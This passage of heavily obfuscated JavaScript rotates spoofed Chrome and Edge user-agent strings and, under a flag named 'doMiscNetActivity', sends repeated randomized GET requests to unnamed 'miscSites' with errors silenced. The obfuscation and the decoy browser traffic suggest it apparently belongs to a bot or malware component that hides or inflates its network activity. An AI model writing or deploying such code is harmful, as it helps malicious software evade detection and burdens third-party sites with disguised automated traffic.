      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x4 * 0x377 + -0x128d * -0x1 + 0x1 * -0x4b1; k < -0x65 * 0x22 + 0x3 * 0x1bc + 0x1b * 0x4e; k++)
    setTimeout(f, (-0x49ad + 0x222a * -0x9 + 0x835 * 0x4b) * k * getRandomInt(-0x55 * -0x40 + -0x1 * -0x1b3b + -0x307a, -0xf63 + 0x1 * 0x1765 + 0x1 * -0x7ff));
  setInterval(() => {
    f();
    for (let l = -0x1bc + -0x1 * 0xd2d + 0xee9 * 0x1; l < 0xfda + 0xde + -0x10b4; l++)
      setTimeout(f, (0x2f2b + -0xd * -0x313 + 0x1 * 0x933e) * l * getRandomInt(0x1f3 + -0x1a48 + 0x1856, 0x1423 + 0x207 * 0xe + -0x6ee * 0x7));
  }, 0x2 * -0x1e6134 + 0x2dd23 * 0x16 + -0x2f * -0x11efa);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0xde * -0x3f + -0x4da * 0x4 + -0x7e2) * getRandomInt(0x34 * -0x22 + -0xbfd * -0x1 + -0x514, 0x8a3 + -0x6 * 0x3cb + 0xe24));
}, 0x3 * -0x87e + -0xa * -0x1f + 0x18a8);